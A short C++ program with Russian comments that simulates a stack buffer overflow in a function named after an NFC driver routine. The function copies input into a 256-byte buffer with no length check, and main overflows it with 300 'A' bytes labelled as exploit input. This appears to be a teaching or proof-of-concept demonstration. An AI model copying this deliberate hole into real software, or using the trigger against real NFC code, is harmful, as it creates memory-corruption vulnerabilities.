#include <iostream>
#include <cstring>

// Симулированная функция с уязвимостью
void phNciNfc_MfCreateXchgDataHdr(char *input, size_t input_len) {
    const size_t MAX_BUFFER_SIZE = 256;
    char buffer[MAX_BUFFER_SIZE];

    // Уязвимый код: Нет проверки input_len
    std::memcpy(buffer, input, input_len);

    // Симулированная обработка...
    std::cout << "Данные обработаны: " << buffer << std::endl;
}

int main() {
    // Вредоносный ввод для эксплуатации уязвимости
    const size_t exploit_size = 300; // Намеренно больше, чем MAX_BUFFER_SIZE
    char exploit_data[exploit_size];

    // Заполняем exploit_data символами 'A'
    std::memset(exploit_data, 'A', exploit_size);
    exploit_data[exploit_size - 1] = '\0'; // Завершаем строку нулевым символом

    // Тригерим уязвимость
    phNciNfc_MfCreateXchgDataHdr(exploit_data, exploit_size);

    return 0;
}
